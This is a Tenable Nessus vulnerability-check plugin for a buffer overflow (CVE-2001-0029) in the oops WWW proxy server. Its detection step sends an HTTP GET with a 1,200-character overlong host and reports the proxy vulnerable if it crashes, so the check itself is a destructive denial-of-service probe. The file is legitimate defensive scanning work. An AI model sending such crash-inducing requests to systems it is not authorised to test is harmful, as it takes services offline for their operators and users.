#
# (C) Tenable Network Security, Inc.
#

#
# Should also cover http://seclists.org/vulnwatch/2003/q2/84
#

include("compat.inc");

if (description)
{
 script_id(10578);
 script_version("$Revision: 1.29 $");
 script_cvs_date("$Date: 2016/11/17 15:28:25 $");

 script_cve_id("CVE-2001-0029");
 script_bugtraq_id(2099);
 script_osvdb_id(476);

 script_name(english:"oops WWW Proxy Server Reverse DNS Response Overflow");
 script_summary(english:"Overflows oops");

 script_set_attribute(attribute:"synopsis", value:
"The remote proxy server is affected by a buffer overflow
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote server appears to be running ooops WWW proxy server version
1.4.6 or older. Such versions are reportedly affected by a buffer
overflow vulnerability. A remote attacker might exploit this
vulnerability to crash the server or execute arbitrary commands on the
remote system.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Dec/188");
 script_set_attribute(attribute:"solution", value:"Upgrade to the latest version of this software");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/12/12");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/12/13");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/http_proxy", 3128);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/http_proxy");
if(!port) port = 3128;

if (! get_port_state(port)) exit(0, "Port "+port+" is closed.");
if (http_is_dead(port: port)) exit(1, "The web proxy on port "+port+" is dead.");

res = http_send_recv3(method:"GET", item:string("http://", crap(12)), port:port, exit_on_fail: 1);

req = string("http://", crap(1200));
res = http_send_recv3(method:"GET", item:req, port:port, exit_on_fail: 0);

if (! isnull(res))
  exit(0, "The web proxy on port "+port+" is still alive.");

  for(i = 0; i < 3 ; i++)
  {
    sleep(1);
    res = http_send_recv3(method:"GET", item:req, port:port, exit_on_fail: 0);
    if (!isnull(res))
      exit(0, "The web proxy on port "+port+" is still alive.");
  }
  security_hole(port);
